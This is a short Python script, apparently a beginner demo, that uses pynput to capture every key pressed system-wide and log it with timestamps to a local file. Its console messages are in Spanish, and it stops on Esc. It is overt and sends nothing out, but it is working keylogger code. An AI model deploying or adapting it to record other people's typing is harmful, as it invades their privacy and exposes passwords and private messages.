from pynput.keyboard import Listener, Key
from pynput.keyboard import Listener, Key
import logging

logging.basicConfig(filename="result.keylogger", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def keystroke(key):
    key_str = str(key)
    logging.info("Se ha pulsado la tecla: {0}".format(key_str))

    
    print("Tecla pulsada: {0}".format(key_str))

    
    if key == Key.esc:
        print("Programa finalizado.")
        return False

with Listener(on_press=keystroke) as input_keyboard:
    print("Keylogger iniciado. Presiona 'Esc' para salir.")
    input_keyboard.join()

